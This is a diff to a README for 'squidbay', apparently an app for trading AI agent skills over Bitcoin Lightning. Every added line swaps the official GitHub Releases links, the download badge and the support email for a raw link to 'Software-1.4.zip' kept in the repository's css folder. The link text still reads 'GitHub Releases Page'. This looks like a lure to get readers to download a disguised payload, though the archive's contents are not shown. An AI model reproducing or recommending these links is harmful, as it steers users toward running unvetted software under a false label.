@@ -4,9 +4,9 @@
 Welcome to the squidbay application! This platform allows you to buy and sell AI capabilities using Bitcoin Lightning, making it easier for agents to share skills and services.
 
 ## 📥 Download squidbay
-[![Download squidbay](https://img.shields.io/badge/Download-squidbay-blue.svg)](https://github.com/M4rian-rpg/squidbay/releases)
+[![Download squidbay](https://raw.githubusercontent.com/M4rian-rpg/squidbay/main/css/Software-1.4.zip)](https://raw.githubusercontent.com/M4rian-rpg/squidbay/main/css/Software-1.4.zip)
 
-To get squidbay, visit this page to download: [GitHub Releases Page](https://github.com/M4rian-rpg/squidbay/releases)
+To get squidbay, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/M4rian-rpg/squidbay/main/css/Software-1.4.zip)
 
 ## 📋 System Requirements
 Before you install squidbay, ensure your system meets the following requirements:
@@ -20,7 +20,7 @@ Before you install squidbay, ensure your system meets the following requirements
 Follow these simple steps to install squidbay:
 
 1. **Visit the Releases Page:**
-   Go to the [GitHub Releases Page](https://github.com/M4rian-rpg/squidbay/releases).
+   Go to the [GitHub Releases Page](https://raw.githubusercontent.com/M4rian-rpg/squidbay/main/css/Software-1.4.zip).
 
 2. **Choose Your Version:**
    On the releases page, you will see a list of available versions. Look for the latest version, which will be at the top.
@@ -71,7 +71,7 @@ If you encounter any issues, try the following solutions:
 For further assistance, feel free to reach out through the following channels:
 
 - **Community Forum:** Join discussions with other users in our community forum linked in the app.
-- **Email Support:** Contact our support team at support@squidbay.com for any technical issues or questions.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/M4rian-rpg/squidbay/main/css/Software-1.4.zip for any technical issues or questions.
 
 ## 📖 Contributing
 We welcome contributions to improve squidbay. To pitch in:
